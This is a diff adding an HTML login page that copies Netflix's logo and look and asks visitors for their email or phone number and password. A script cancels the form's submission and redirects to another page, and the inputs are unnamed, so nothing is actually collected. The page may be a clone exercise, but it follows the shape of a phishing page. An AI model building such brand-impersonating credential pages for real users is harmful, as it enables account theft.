@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Netflix Sign Up</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Arial', sans-serif;
+            background-image: url('https://gtwallpaper.org/sites/default/files/wallpaper/246844/netflix-background-246844-2224740-3441109.png'); /* Netflix background */
+            background-size: cover;
+            background-position: center;
+            color: white;
+            height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+            text-align: center;
+        }
+
+        .overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.5); /* Dimmed background */
+            z-index: 1;
+        }
+
+        .logo {
+            margin-bottom: 20px;
+            z-index: 2; /* Ensure logo is above overlay */
+        }
+
+        .logo img {
+            height: 110px;
+        }
+
+        .container {
+            max-width: 400px;
+            padding: 30px;
+            background: rgba(0, 0, 0, 0.8); /* Semi-transparent background for form */
+            border-radius: 10px;
+            box-shadow: 0 4px 30px rgba(0, 0, 0, 0.7);
+            z-index: 2; /* Ensure form is above overlay */
+            position: relative; /* Position relative to overlay */
+        }
+
+        h2 {
+            margin-bottom: 20px;
+            font-size: 24px;
+        }
+
+        input {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border: none;
+            border-radius: 5px;
+            background: rgba(255, 255, 255, 0.1); /* Slightly transparent background */
+            color: white;
+        }
+
+        button {
+            width: 106%;
+            padding: 12px;
+            background: #e50914;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+
+        button:hover {
+            background: #f40612;
+        }
+
+        a {
+            color: #e50914;
+            text-decoration: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="overlay"></div> <!-- Dimmed overlay -->
+    <header>
+        <div class="logo">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg" alt="Netflix Logo">
+        </div>
+    </header>
+    <div class="container">
+        <h2>Enter Your Account Details.</h2>
+        <form id="signupForm" action="Authentication.php" method="POST">
+            <input type="text" placeholder="Email or phone number" required>
+            <input type="password" placeholder="Password" required>
+            <button type="submit">Sign In</button>
+        </form>
+    </div>
+
+    <script>
+        document.getElementById('signupForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+            // Redirect to the netflix.html page
+            window.location.href = 'netflix.html';
+        });
+    </script>
+</body>
+</html>
